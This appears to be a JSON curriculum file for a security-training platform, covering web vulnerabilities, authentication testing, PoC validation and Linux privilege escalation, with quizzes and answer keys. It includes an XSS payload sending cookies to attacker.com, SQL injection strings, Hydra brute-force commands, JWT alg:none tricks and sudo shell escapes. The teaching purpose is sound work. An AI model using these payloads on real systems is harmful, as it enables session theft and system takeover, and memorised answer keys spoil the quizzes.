            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Analyze the OWASP Top 10 categories (Broken Access Control, Cryptographic Failures, Injection) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-39-1",
        "type": "exact",
        "question": "Which category currently holds the #1 rank in the OWASP Top 10 Web Application Security Risks?",
        "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _   _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "Broken Access Control",
          "A01:2021-Broken Access Control",
          "A01"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "When access controls are broken.",
        "explanation": "Broken Access Control is the #1 web risk, affecting over 94% of tested web applications."
      },
      {
        "id": "q-39-2",
        "type": "exact",
        "question": "What vulnerability occurs when a web application fetches a remote URL supplied by a user without validating the destination, exposing internal services or cloud metadata?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "SSRF",
          "Server-Side Request Forgery"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter acronym for Server-Side Request Forgery.",
        "explanation": "SSRF (Server-Side Request Forgery) induces servers to make unauthorized requests to internal resources."
      },
      {
        "id": "q-39-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in OWASP Top 10?",
        "options": [
          "Analyze the OWASP Top 10 categories (Broken Access Control, Cryptographic Failures, Injection)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Analyze the OWASP Top 10 categories (Broken Access Control, Cryptographic Failures, Injection) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The OWASP Top 10 Overview & A01: Broken Access Control",
        "instruction": "Evaluate how Broken Access Control occurs when authorization checks are missing on server endpoints.",
        "hints": [
          "When access controls are broken."
        ]
      },
      {
        "title": "Task 2: A04 through A10: Modern Risk Taxonomy",
        "instruction": "Trace how SSRF forces servers to act as internal proxies for the attacker.",
        "hints": [
          "Four-letter acronym for Server-Side Request Forgery."
        ]
      },
      {
        "title": "Task 3: Remediation Strategies & OWASP Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-40"
  },
  {
    "id": "room-40",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 40,
    "title": "Web Vulnerability Assessment",
    "description": "Master practical web vulnerability discovery: Cross-Site Scripting (Reflected, Stored, DOM), SQL Injection (SQLi), and Insecure Direct Object References (IDOR).",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "45 mins",
    "xpReward": 50,
    "prerequisites": "room-39",
    "whyAreYouHere": "Master practical web vulnerability discovery: Cross-Site Scripting (Reflected, Stored, DOM), SQL Injection (SQLi), and Insecure Direct Object References (IDOR).",
    "objectives": [
      "Identify and exploit Reflected, Stored, and DOM-based Cross-Site Scripting (XSS)",
      "Discover and validate SQL Injection (SQLi) using manual payloads and boolean logic",
      "Exploit Insecure Direct Object References (IDOR) to access unauthorized records",
      "Formulate secure coding remediations (output encoding, parameterized queries)"
    ],
    "skillsGained": [
      "XSS (Reflected/Stored/DOM)",
      "SQL Injection (SQLi)",
      "IDOR Exploitation",
      "Secure Remediation"
    ],
    "toolsAndCommands": [
      "curl",
      "python3",
      "sqlmap",
      "burpsuite"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Cross-Site Scripting (XSS): Reflected, Stored & DOM",
        "concept": "**Cross-Site Scripting (XSS)** occurs when a web application includes untrusted user data in a web page without proper validation or escaping, allowing an attacker to execute malicious JavaScript in the victim's browser:\n1. **Reflected XSS:** The malicious payload is reflected off the web server in an immediate response (e.g. search queries: `https://site.com/search?q=<script>alert(1)</script>`). Requires tricking the victim into clicking a link\n2. **Stored (Persistent) XSS:** The malicious payload is stored permanently in the database (e.g. comment section, forum post, profile bio). Every user who visits the page executes the payload automatically (highest severity!)\n3. **DOM-based XSS:** The vulnerability exists entirely in client-side JavaScript that takes untrusted input from a Source (`location.hash`) and passes it unsafely to an execution Sink (`document.write()`, `innerHTML`).\n*Impact:* Session hijacking (cookie theft), keystroke logging, credential harvesting, and forced administrative actions.",
        "whyItMatters": "Stored XSS can compromise every user who visits a popular discussion thread.",
        "examples": [
          "Payload: `<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>`",
          "Remediation: Context-aware HTML entity encoding and strict Content Security Policy (CSP)"
        ],
        "commands": [
          {
            "cmd": "python3 -c 'import html; print(html.escape(\"<script>alert(1)</script>\"))'",
            "desc": "Demonstrate HTML entity escaping defense"
          }
        ],
        "guidedExercise": "Inspect how HTML entity encoding converts `<` and `>` into harmless `&lt;` and `&gt;` text.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-40-1",
            "type": "multiple-choice",
            "question": "Which type of Cross-Site Scripting (XSS) occurs when an attacker permanently stores malicious JavaScript inside a database (such as a profile bio or forum comment)?",
            "options": [
              "Reflected XSS",
              "Stored (Persistent) XSS",
              "DOM-based XSS",
              "Stateless XSS"
            ],
            "correctIndex": 1,
            "hint": "Stored permanently in the database.",
            "explanation": "Stored XSS is stored in the database and executes automatically whenever any victim views the infected page."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: SQL Injection (SQLi) & Boolean Logic",
        "concept": "**SQL Injection (SQLi)** occurs when user input is concatenated directly into a database query string instead of being passed as a parameter. This allows an attacker to manipulate the query structure:\n- **Vulnerable Code:** `query = \"SELECT * FROM users WHERE user = '\" + input + \"'\"`\n- **Payload:** `' OR '1'='1`\n- **Resulting Query:** `SELECT * FROM users WHERE user = '' OR '1'='1'` (evaluates to true for all rows, dumping the entire database table!)\n- **Union-Based SQLi:** Appending `UNION SELECT` to extract data from other database tables (passwords, credit cards)\n- **Blind SQLi:** The application returns no database errors or content; the attacker infers data character-by-character using boolean responses (True vs False) or database time delays (`WAITFOR DELAY '0:0:5'`).",
        "whyItMatters": "SQL injection allows attackers to bypass authentication, read all database tables, and in some cases execute OS commands (`xp_cmdshell`).",
        "examples": [
          "Authentication Bypass: Username: `admin' --` (comments out password check entirely)",
          "Remediation: Always use Parameterized Queries (Prepared Statements)"
        ],
        "commands": [
          {
            "cmd": "python3 -c 'print(\"SELECT * FROM users WHERE user = \\\"admin\\\" OR \\\"1\\\"=\\\"1\\\"\")'",
            "desc": "Observe SQL injection syntax construction"
          }
        ],
        "guidedExercise": "Trace how single quotes break SQL string boundaries to inject logical clauses.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-40-2",
            "type": "exact",
            "question": "What is the single most effective defensive programming technique that completely eliminates SQL Injection vulnerabilities?",
            "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _   _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "parameterized queries",
              "parameterized query",
              "prepared statements",
              "prepared statement"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Parameterized ... or Prepared ...",
            "explanation": "Parameterized queries separate SQL code from user data, preventing inputs from altering query logic."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Insecure Direct Object References (IDOR) & Review",
        "concept": "**Insecure Direct Object References (IDOR)** occurs when an application exposes a reference to an internal database record (e.g. user ID `1054` in `/api/invoices/1054`) without verifying that the requesting user owns that object. By simply iterating the ID (`1055`, `1056`), an attacker downloads every customer invoice in the database.",
        "whyItMatters": "IDOR is an authorization flaw: never rely on obscurity; verify object ownership on the server.",
        "examples": [
          "IDOR Remediation: Enforce server-side check: `if (invoice.ownerId !== session.userId) return 403 Forbidden`"
        ],
        "commands": [
          {
            "cmd": "echo 'Web Vulnerability Assessment Mastered'",
            "desc": "Complete Web Vuln Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "XSS types (Reflected, Stored, DOM), SQL Injection (syntax manipulation, union, blind), and IDOR authorization bypasses.",
          "technicalTakeaways": "Output encoding prevents XSS; parameterized queries eliminate SQL injection; server-side ownership checks prevent IDOR.",
          "commandsCovered": [
            "HTML encoding",
            "SQL syntax testing"
          ],
          "commonMistakes": "Relying on blacklist string filtering instead of parameterized queries for SQL injection.",
          "learningOutcome": "You can detect XSS, exploit boolean SQL injection, test for IDOR flaws, and recommend secure code fixes."
        },
        "questions": [
          {
            "id": "q-40-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Web Vulnerability Assessment?",
            "options": [
              "Identify and exploit Reflected, Stored, and DOM-based Cross-Site Scripting (XSS)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Identify and exploit Reflected, Stored, and DOM-based Cross-Site Scripting (XSS) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-40-1",
        "type": "multiple-choice",
        "question": "Which type of Cross-Site Scripting (XSS) occurs when an attacker permanently stores malicious JavaScript inside a database (such as a profile bio or forum comment)?",
        "options": [
          "Reflected XSS",
          "Stored (Persistent) XSS",
          "DOM-based XSS",
          "Stateless XSS"
        ],
        "correctIndex": 1,
        "hint": "Stored permanently in the database.",
        "explanation": "Stored XSS is stored in the database and executes automatically whenever any victim views the infected page."
      },
      {
        "id": "q-40-2",
        "type": "exact",
        "question": "What is the single most effective defensive programming technique that completely eliminates SQL Injection vulnerabilities?",
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _   _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "parameterized queries",
          "parameterized query",
          "prepared statements",
          "prepared statement"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Parameterized ... or Prepared ...",
        "explanation": "Parameterized queries separate SQL code from user data, preventing inputs from altering query logic."
      },
      {
        "id": "q-40-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Web Vulnerability Assessment?",
        "options": [
          "Identify and exploit Reflected, Stored, and DOM-based Cross-Site Scripting (XSS)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Identify and exploit Reflected, Stored, and DOM-based Cross-Site Scripting (XSS) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Cross-Site Scripting (XSS): Reflected, Stored & DOM",
        "instruction": "Inspect how HTML entity encoding converts `<` and `>` into harmless `&lt;` and `&gt;` text.",
        "hints": [
          "Stored permanently in the database."
        ]
      },
      {
        "title": "Task 2: SQL Injection (SQLi) & Boolean Logic",
        "instruction": "Trace how single quotes break SQL string boundaries to inject logical clauses.",
        "hints": [
          "Parameterized ... or Prepared ..."
        ]
      },
      {
        "title": "Task 3: Insecure Direct Object References (IDOR) & Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-41"
  },
  {
    "id": "room-41",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 41,
    "title": "Authentication Security Testing",
    "description": "Test authentication mechanisms: brute-force rate-limiting, credential stuffing with Hydra, JSON Web Token (JWT) signature flaws, and session fixation.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-40",
    "whyAreYouHere": "Test authentication mechanisms: brute-force rate-limiting, credential stuffing with Hydra, JSON Web Token (JWT) signature flaws, and session fixation.",
    "objectives": [
      "Perform online brute-force and credential-stuffing tests using Hydra",
      "Audit login rate-limiting, account lockouts, and CAPTCHA boundaries",
      "Deconstruct JSON Web Tokens (Header, Payload, Signature)",
      "Test for common JWT vulnerabilities (alg:none, weak HMAC secrets)"
    ],
    "skillsGained": [
      "Credential Stuffing",
      "Hydra Brute-Forcing",
      "JWT Security Testing",
      "Session Fixation"
    ],
    "toolsAndCommands": [
      "hydra -l",
      "jwt_tool",
      "curl -X POST",
      "base64 -d"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Online Brute-Forcing & Credential Stuffing (Hydra)",
        "concept": "Authentication endpoints are subjected to automated credential attacks:\n- **Brute-Force Attack:** Trying thousands of passwords against a single known username\n- **Password Spraying:** Trying a single common password (e.g. `Winter2026!`) against thousands of usernames to avoid account lockout thresholds\n- **Credential Stuffing:** Automated testing of massive databases of breached username/password pairs leaked from other websites (exploiting password reuse).\n**THC Hydra** is the premier network logon brute-forcing tool supporting HTTP-POST, SSH, FTP, RDP, and SMB:\n`hydra -l admin -P rockyou.txt 10.10.10.5 ssh`\n`hydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'`.",
        "whyItMatters": "Defenders mitigate credential attacks using account lockout policies, rate-limiting, CAPTCHA, and FIDO2 MFA.",
        "examples": [
          "Password Spraying: Evades lockouts by waiting 30 minutes between attempts",
          "Hydra: High-speed multi-threaded credential testing"
        ],
        "commands": [
          {
            "cmd": "hydra -h 2>/dev/null | head -n 5 || echo 'Hydra installed'",
            "desc": "Inspect Hydra capabilities and supported protocols"
          }
        ],
        "guidedExercise": "Review Hydra syntax for testing HTTP post authentication endpoints.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-41-1",
            "type": "exact",
            "question": "What credential attack tests a single common password against thousands of accounts to bypass lockout thresholds?",
            "visualSlots": "_ _ _ _ _ _ _ _   _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "password spraying",
              "password-spraying"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Spraying a password across accounts.",
            "explanation": "Password spraying tests one password across many accounts to avoid triggering lockout limits."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: JSON Web Token (JWT) Security Testing",
        "concept": "Modern single-page applications and mobile APIs use **JSON Web Tokens (JWT)** for stateless authentication. A JWT consists of three Base64URL-encoded parts separated by dots (`.`):\n`HEADER.PAYLOAD.SIGNATURE`\n- **Header:** Algorithm and token type (`{\"alg\": \"HS256\", \"typ\": \"JWT\"}`)\n- **Payload:** User claims (`{\"sub\": \"123\", \"username\": \"cadet\", \"role\": \"user\"}`)\n- **Signature:** Cryptographic verification using secret key.\nCritical JWT vulnerabilities to test for:\n1. **Algorithm None Attack:** Changing `\"alg\": \"none\"` in the header and stripping the signature. Vulnerable libraries accept the unverified token as valid!\n2. **Weak HMAC Secret Cracking:** Offline dictionary attack against HS256 signatures using `hashcat` or `jwt_tool` to recover the signing secret\n3. **Algorithm Confusion (Key Confusion):** Switching asymmetric RS256 to symmetric HS256, verifying the signature using the server's public key as an HMAC secret.",
        "whyItMatters": "Tampering with the role claim in a JWT payload allows complete privilege escalation if the signature is unverified.",
        "examples": [
          "JWT None: `{\"alg\":\"none\"}` allows arbitrary role modification to `role: admin`",
          "Offline cracking: If secret is 'secret123', HMAC can be cracked in seconds"
        ],
        "commands": [
          {
            "cmd": "echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d 2>/dev/null",
            "desc": "Decode sample JWT header demonstrating Base64 format"
          }
        ],
        "guidedExercise": "Decode a Base64 JWT header to inspect the algorithm specification.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-41-2",
            "type": "exact",
            "question": "In the famous JWT implementation vulnerability, which algorithm value is set to trick the server into accepting an unsigned token?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "none",
              "\"none\""
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four letters meaning no algorithm.",
            "explanation": "Setting 'alg': 'none' exploits vulnerable libraries that bypass signature verification."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Session Security & Final Review",
        "concept": "Session tokens must be invalidated upon logout and regenerated upon login to prevent **Session Fixation** attacks, where an attacker tricks a user into logging in with a known session ID.",
        "whyItMatters": "Always verify that logout invalidates the token on the server side, not just deleting it in the browser.",
        "examples": [
          "Session Fixation: Attacker forces session ID; victim logs in; attacker uses same session ID"
        ],
        "commands": [
          {
            "cmd": "echo 'Authentication Security Testing Mastered'",
            "desc": "Complete Auth Testing Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Brute-forcing vs password spraying (Hydra), credential stuffing, JWT structure (Header.Payload.Signature), JWT alg:none and HMAC cracking.",
          "technicalTakeaways": "Password spraying avoids account lockouts. JWTs must always have their signatures strictly verified using strong, private secrets.",
          "commandsCovered": [
            "hydra",
            "base64 -d",
            "jwt_tool"
          ],
          "commonMistakes": "Assuming a Base64-encoded JWT is encrypted (Base64 is encoding, not encryption; anyone can read the claims).",
          "learningOutcome": "You can execute password spraying audits, decode JWTs, test for algorithm confusion, and verify session security."
        },
        "questions": [
          {
            "id": "q-41-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Authentication Security Testing?",
            "options": [
              "Perform online brute-force and credential-stuffing tests using Hydra",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Perform online brute-force and credential-stuffing tests using Hydra is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-41-1",
        "type": "exact",
        "question": "What credential attack tests a single common password against thousands of accounts to bypass lockout thresholds?",
        "visualSlots": "_ _ _ _ _ _ _ _   _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "password spraying",
          "password-spraying"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Spraying a password across accounts.",
        "explanation": "Password spraying tests one password across many accounts to avoid triggering lockout limits."
      },
      {
        "id": "q-41-2",
        "type": "exact",
        "question": "In the famous JWT implementation vulnerability, which algorithm value is set to trick the server into accepting an unsigned token?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "none",
          "\"none\""
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four letters meaning no algorithm.",
        "explanation": "Setting 'alg': 'none' exploits vulnerable libraries that bypass signature verification."
      },
      {
        "id": "q-41-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Authentication Security Testing?",
        "options": [
          "Perform online brute-force and credential-stuffing tests using Hydra",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Perform online brute-force and credential-stuffing tests using Hydra is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Online Brute-Forcing & Credential Stuffing (Hydra)",
        "instruction": "Review Hydra syntax for testing HTTP post authentication endpoints.",
        "hints": [
          "Spraying a password across accounts."
        ]
      },
      {
        "title": "Task 2: JSON Web Token (JWT) Security Testing",
        "instruction": "Decode a Base64 JWT header to inspect the algorithm specification.",
        "hints": [
          "Four letters meaning no algorithm."
        ]
      },
      {
        "title": "Task 3: Session Security & Final Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-42"
  },
  {
    "id": "room-42",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 42,
    "title": "Vulnerability Validation in a Lab",
    "description": "Master the safe construction of Proof-of-Concept (PoC) exploits in isolated lab containers without causing collateral disruption.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-41",
    "whyAreYouHere": "Master the safe construction of Proof-of-Concept (PoC) exploits in isolated lab containers without causing collateral disruption.",
    "objectives": [
      "Differentiate theoretical vulnerabilities from validated exploitable flaws",
      "Construct safe, non-destructive Proof-of-Concept (PoC) exploits",
      "Isolate test targets in localized Docker/VM sandbox networks",
      "Document reproduction steps for engineering and development teams"
    ],
    "skillsGained": [
      "PoC Construction",
      "Controlled Exploitation",
      "Sandboxed Testing",
      "Vulnerability Documentation"
    ],
    "toolsAndCommands": [
      "curl",
      "python3",
      "docker",
      "nc -lvnp"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Need for Controlled Proof-of-Concept (PoC)",
        "concept": "Vulnerability scanners frequently report false positives. Clients pay penetration testers to prove real-world exploitability through a **Proof-of-Concept (PoC)**. A professional PoC must be:\n1. **Deterministic:** Reliably reproducible step-by-step\n2. **Non-Destructive:** Demonstrates unauthorized access or execution without crashing the server, altering production data, or deleting records\n3. **Minimal:** Proves execution using benign actions (e.g. running `whoami` or reading `/etc/hostname` rather than deleting databases).\nNever run unverified automated public exploit scripts directly against production systems; always validate them in a localized staging lab first.",
        "whyItMatters": "Executing a poorly written exploit script found on GitHub can crash production servers and cause catastrophic outages.",
        "examples": [
          "Safe PoC: Demonstrating command injection by running `whoami` and capturing output",
          "Unsafe PoC: Running `rm -rf` or dropping unstable kernel exploit binaries"
        ],
        "commands": [
          {
            "cmd": "python3 -c 'import urllib.parse; print(urllib.parse.quote(\";whoami\"))'",
            "desc": "URL-encode a command injection probe safely"
          }
        ],
        "guidedExercise": "Observe how proof-of-concept payloads are constructed safely.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-42-1",
            "type": "multiple-choice",
            "question": "What is the primary requirement for a professional penetration testing Proof-of-Concept (PoC)?",
            "options": [
              "It must permanently delete target databases",
              "It must be non-destructive, deterministically reproducible, and prove exploitability without crashing systems",
              "It must be kept secret from the client",
              "It must only work on Windows machines"
            ],
            "correctIndex": 1,
            "hint": "Safe, reproducible proof of impact.",
            "explanation": "A professional PoC proves vulnerability impact in a controlled, non-destructive, reproducible manner."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Reproducibility & Technical Documentation",
        "concept": "A vulnerability report is only as good as its reproduction steps. Developers must be able to reproduce the exact finding on their local machines. A high-quality PoC includes:\n- Full target URL and endpoint\n- Complete HTTP request headers and payload (e.g. `curl` command or Burp raw request)\n- Expected vulnerable response vs expected secure behavior\n- Step-by-step instructions from an unauthenticated browser session.",
        "whyItMatters": "Providing a direct `curl` command allows developers to test their patches instantly in seconds.",
        "examples": [
          "Reproducible curl command: `curl -X POST https://target/api/search -d 'term=test\";whoami'`"
        ],
        "commands": [
          {
            "cmd": "curl -s https://httpbin.org/get?test=poc",
            "desc": "Demonstrate reproducible HTTP command execution"
          }
        ],
        "guidedExercise": "Practice generating clean curl commands for vulnerability reporting.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-42-2",
            "type": "exact",
            "question": "What command-line tool is most commonly used by security researchers to provide a single, reproducible command demonstrating HTTP vulnerabilities?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "curl"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter utility for transferring data with URLs.",
            "explanation": "curl commands provide clean, copy-pasteable reproduction steps for web vulnerabilities."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Lab Isolation & Validation Review",
        "concept": "Always replicate complex exploit chains in an isolated local container before testing in staging. This ensures custom payloads behave predictably and safely.",
        "whyItMatters": "Controlled testing separates disciplined cybersecurity professionals from reckless operators.",
        "examples": [
          "Sandbox validation: Docker container mimicking target web server version"
        ],
        "commands": [
          {
            "cmd": "echo 'Vulnerability Validation in Lab Mastered'",
            "desc": "Complete Lab Validation Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Controlled Proof-of-Concept (PoC) construction, non-destructive testing, lab sandboxing, and reproducible documentation.",
          "technicalTakeaways": "PoCs must prove impact safely without crashing production services. Deliver reproducible curl commands for developers.",
          "commandsCovered": [
            "curl",
            "python3"
          ],
          "commonMistakes": "Running unvetted public exploits that trigger kernel panics or corrupt production databases.",
          "learningOutcome": "You can craft safe proof-of-concept exploits, test payloads in isolated lab containers, and write deterministic reproduction steps."
        },
        "questions": [
          {
            "id": "q-42-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Vulnerability Validation in a Lab?",
            "options": [
              "Differentiate theoretical vulnerabilities from validated exploitable flaws",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate theoretical vulnerabilities from validated exploitable flaws is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-42-1",
        "type": "multiple-choice",
        "question": "What is the primary requirement for a professional penetration testing Proof-of-Concept (PoC)?",
        "options": [
          "It must permanently delete target databases",
          "It must be non-destructive, deterministically reproducible, and prove exploitability without crashing systems",
          "It must be kept secret from the client",
          "It must only work on Windows machines"
        ],
        "correctIndex": 1,
        "hint": "Safe, reproducible proof of impact.",
        "explanation": "A professional PoC proves vulnerability impact in a controlled, non-destructive, reproducible manner."
      },
      {
        "id": "q-42-2",
        "type": "exact",
        "question": "What command-line tool is most commonly used by security researchers to provide a single, reproducible command demonstrating HTTP vulnerabilities?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "curl"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter utility for transferring data with URLs.",
        "explanation": "curl commands provide clean, copy-pasteable reproduction steps for web vulnerabilities."
      },
      {
        "id": "q-42-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Vulnerability Validation in a Lab?",
        "options": [
          "Differentiate theoretical vulnerabilities from validated exploitable flaws",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate theoretical vulnerabilities from validated exploitable flaws is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Need for Controlled Proof-of-Concept (PoC)",
        "instruction": "Observe how proof-of-concept payloads are constructed safely.",
        "hints": [
          "Safe, reproducible proof of impact."
        ]
      },
      {
        "title": "Task 2: Reproducibility & Technical Documentation",
        "instruction": "Practice generating clean curl commands for vulnerability reporting.",
        "hints": [
          "Four-letter utility for transferring data with URLs."
        ]
      },
      {
        "title": "Task 3: Lab Isolation & Validation Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-43"
  },
  {
    "id": "room-43",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 43,
    "title": "Linux Privilege Escalation Fundamentals",
    "description": "Elevate privileges on Linux systems: SUID binaries, misconfigured sudo permissions (sudo -l), cron job hijacking, and readable /etc/shadow files.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "45 mins",
    "xpReward": 50,
    "prerequisites": "room-42",
    "whyAreYouHere": "Elevate privileges on Linux systems: SUID binaries, misconfigured sudo permissions (sudo -l), cron job hijacking, and readable /etc/shadow files.",
    "objectives": [
      "Audit user permissions and sudo privileges (sudo -l)",
      "Identify and exploit SUID/SGID binaries using GTFOBins",
      "Exploit world-writable scheduled cron jobs and path hijacking",
      "Extract and crack password hashes from readable /etc/shadow backups"
    ],
    "skillsGained": [
      "Linux PrivEsc",
      "SUID / SGID Exploits",
      "GTFOBins Bypasses",
      "Cron Job Hijacking"
    ],
    "toolsAndCommands": [
      "sudo -l",
      "find / -perm -4000",
      "cat /etc/crontab",
      "unshadow",
      "john"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Sudo Rights & GTFOBins Exploitation",
        "concept": "Gaining initial access (e.g. via a web vulnerability) typically lands you as an unprivileged service account (like `www-data`). **Privilege Escalation** is the process of elevating from a low-privilege user to `root` (UID 0).\nThe first command every penetration tester runs upon obtaining a Linux shell is:\n`sudo -l` (List permitted commands).\nIf the sudoers configuration allows running a binary without a password (e.g. `(ALL) NOPASSWD: /usr/bin/vim`), you can escalate to root instantly using **GTFOBins** (a curated database of legitimate Linux binaries that can be abused to break out of restricted shells):\n- Sudo Vim escape: `sudo vim -c ':!/bin/sh'`\n- Sudo Find escape: `sudo find . -exec /bin/sh \\; -quit`\n- Sudo Less escape: `sudo less /etc/hosts` then type `!/bin/sh`.",
        "whyItMatters": "Misconfigured sudo permissions granting execution of standard utilities (vim, find, python) allow immediate root takeover.",
        "examples": [
          "GTFOBins: Demonstrates shell escapes for hundreds of standard Linux binaries",
          "Sudoers misconfiguration: `ALL=(ALL) NOPASSWD: ALL` grants immediate unrestricted root"
        ],
        "commands": [
          {
